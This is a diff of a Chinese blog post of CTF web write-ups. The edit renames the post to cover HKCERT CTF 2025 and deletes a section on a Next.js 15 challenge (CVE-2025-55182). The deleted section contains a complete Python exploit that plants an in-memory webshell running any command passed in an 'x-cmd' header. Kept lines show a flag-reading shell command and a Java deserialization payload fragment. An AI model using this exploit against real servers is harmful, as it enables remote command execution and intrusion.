@@ -1,15 +1,15 @@
 ---
-title: "Web CTF 题解：BabyUpload && Dam-Breach && Hessian-Labyrinth && NetWatcher && React"
+title: "HKCERT CTF 2025 线上赛题解"
 slug: "web-ctf-five-challenges"
-date: 2025-12-08T23:19:37+08:00
+date: 2025-12-21T16:00:00+08:00
 draft: false
-tags: ["CTF", "Web", "Java", "反序列化", "DuckDB", "React"]
+tags: ["HKCERT CTF", "Web", "Java", "反序列化", "DuckDB"]
 categories: ["CTF"]
-description: "五道 Web 题目记录，涵盖 Apache 配置、DuckDB 扩展、Hessian 反序列化、Java 文件读取与 React 漏洞利用。"
+description: "HKCERT CTF 2025 线上赛题解，涵盖 Apache 配置、DuckDB 扩展、Hessian 反序列化与 Java 文件读取。"
 tocOpen: true
 ---
 
-本文整理五道 Web 题目的解题过程：从 Apache 配置和 DuckDB 扩展，到 Java 反序列化与 React 服务端组件。
+HKCERT CTF 2025 线上初赛于香港时间 2025 年 12 月 19 日 16:00 至 21 日 16:00 举行。本文整理 BabyUpload、Dam-Breach、Hessian-Labyrinth 和 NetWatcher 四道题的解题过程。
 
 
 ## BabyUpload
@@ -3422,101 +3422,4 @@ rO0ABXNyACNqYXZheC5zd2luZy5ldmVudC5FdmVudExpc3RlbmVyTGlzdJFIzC1z3w7eAwAAeHB0ABdq
 /app/ >/usr/bin/sh -p -c 'cat /root/flag'
 
 flag{e4d07e6a-7742-410f-9034-9fa9893b6698}
-```
-
-
-## React
-
-题目使用 Next.js 15，考察 CVE-2025-55182；以下保留原题解的利用脚本。
-
-### EXP
-
-注入内存吗获取FLAG
-
-```python
-import requests
-import sys
-import json
-import time
-
-TARGET = "http://localhost:3000/"
-
-if len(sys.argv) > 1:
-    TARGET = sys.argv[1]
-
-print(f"[*] Target: {TARGET}")
-
-# Payload 构造：注入 Webshell 到 http.Server.prototype.emit
-# 这段 JS 会拦截所有请求，检查 'x-cmd' 头，如果有则执行命令并返回结果
-crafted_chunk = {
-    "then": "$1:__proto__:then",
-    "status": "resolved_model",
-    "reason": -1,
-    "value": "{\"then\":\"$B0\"}",
-    "_response": {
-        "_prefix": "(async()=>{const http=await import('node:http');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const cmd=req.headers['x-cmd'];if(cmd){cp.exec(cmd,(err,stdout,stderr)=>{res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({success:!err,stdout,stderr,error:err?err.message:null}));});return true;}}return originalEmit.apply(this,arguments);};})();",
-        "_formData": {
-            "get": "$1:constructor:constructor"
-        }
-    }
-}
-
-files = {
-    "0": (None, json.dumps(crafted_chunk)),
-    "1": (None, '"$@0"'),
-}
-
-headers = { "Next-Action": "x" }
-
-# 1. 初始化连接
-try:
-    print("[*] Sending initial request...")
-    requests.get(TARGET, timeout=5)
-except:
-    pass
-
-# 2. 发送 Exploit 注入 Webshell
-print("[*] Sending exploit payload...")
-try:
-    # 这里的 timeout 设置较短，因为注入过程可能会导致服务端短暂无响应
-    requests.post(TARGET, files=files, headers=headers, timeout=5)
-except requests.exceptions.Timeout:
-    print("[!] Injection request timed out (this is common/expected).")
-except Exception as e:
-    print(f"[!] Injection error: {e}")
-
-# 等待一小会儿确保 payload 执行
-time.sleep(1)
-
-# 3. 触发 Webshell 获取 Flag
-# 对应你的要求: curl -H 'X-CMD: cat /flag' -X POST
-print("[*] Triggering webshell to cat /flag...")
-
-cmd_headers = {
-    "X-CMD": "cat /flag"
-}
-
-try:
-    # 使用 POST 请求触发命令
-    resp = requests.post(TARGET, headers=cmd_headers, timeout=10)
-
-    print("-" * 20 + " RESPONSE " + "-" * 20)
-
-    # 尝试解析 JSON 输出 (因为 Payload 返回的是 JSON)
-    try:
-        output = resp.json()
-        if output.get('stdout'):
-            print(f"[+] STDOUT:\n{output['stdout']}")
-        if output.get('stderr'):
-            print(f"[-] STDERR:\n{output['stderr']}")
-        if not output.get('stdout') and not output.get('stderr'):
-             print(f"[+] Raw Response:\n{resp.text}")
-    except:
-        # 如果不是 JSON，直接打印文本
-        print(f"[+] Raw Response:\n{resp.text}")
-
-    print("-" * 50)
-
-except Exception as e:
-    print(f"[-] Failed to retrieve flag: {e}")
 ```
